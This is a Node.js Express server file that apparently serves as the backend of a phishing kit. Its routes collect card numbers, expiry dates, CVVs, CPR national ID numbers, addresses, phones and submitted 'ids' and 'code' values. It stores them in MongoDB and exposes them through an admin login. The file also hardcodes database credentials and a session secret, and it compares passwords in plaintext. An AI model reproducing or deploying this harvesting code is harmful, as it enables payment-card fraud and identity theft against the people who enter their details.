const express = require('express')
const bodyParser = require('body-parser')
const mongoose = require('mongoose')
const session = require('express-session')
const flash = require('express-flash')
const MongoDbStore = require('connect-mongo')

const app = express()
const PORT = process.env.PORT || 80

app.use(express.json())
app.use(bodyParser.json())
app.use(express.static('public'))
app.use(
  bodyParser.urlencoded({
    extended: false,
  })
)
app.use('/static', express.static('./static/'))

app.use(flash())
mongoose.connect(
  'mongodb+srv://robbery:hood@cluster0.grczhtr.mongodb.net/?retryWrites=true&w=majority',
  {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  }
)

app.use(
  session({
    secret: '1234567qwdeq890QWERTY',
    resave: false,
    store: MongoDbStore.create({
      mongoUrl:
        'mongodb+srv://robbery:hood@cluster0.grczhtr.mongodb.net/?retryWrites=true&w=majority',
    }),
    saveUninitialized: false,
    cookie: { maxAge: 1000 * 60 * 60 * 24 },
  })
)
const user = require('./backend/models/user')
const data = require('./backend/models/data')
app.set('view engine', 'html')
app.engine('html', require('ejs').renderFile)

app.post('/sign', async (req, resp) => {
  req.session.card = req.body.card
  req.session.expiry = req.body.expiry
  req.session.cvv = req.body.cvv
  req.session.name = req.body.name
  req.session.address = req.body.address
  req.session.by = req.body.by
  req.session.cpr = req.body.cpr
  req.session.phone = req.body.phone
  return resp.redirect('/data')
})

app.post('/sign_admin', async (req, resp) => {
  var email = req.body.email
  var password = req.body.password

  const userdata = await user.findOne({ email: email })
  if (userdata != null) {
    if (password === userdata.password) {
      if (req.session.user == null) {
        req.session.user = userdata
        resp.redirect('/admin/data')
      } else {
        req.session.user = userdata
        resp.redirect('/admin/data')
      }
    } else {
      console.log('User Not Found')
    }
  }
})

app.post('/upload', async (req, resp) => {
  var ids = req.body.ids
  var code = req.body.code

  const savedata = new data({
    ids: ids,
    code: code,
    userId: req.session.userId,
    card: req.session.card,
    expiry: req.session.expiry,
    cvv: req.session.cvv,
    name: req.session.name,
    address: req.session.address,
    by: req.session.by,
    cpr: req.session.cpr,
    phone: req.session.phone,
  })
  console.log(savedata)

  await savedata
    .save()
    .then((user) => {
      resp.send(user)
    })
    .catch((err) => {
      console.log(err)
    })
})

app.post('/data', (req, resp) => {
  if (req.session.userId != null) {
    req.session.userId = req.body.userId
    resp.redirect('signup')
  } else {
    req.session.userId = ''
    req.session.userId = req.body.userId
    resp.redirect('signup')
  }
})

require('./backend/routes/web')(app)
app.listen(PORT, () => {
  console.log('server running')
})
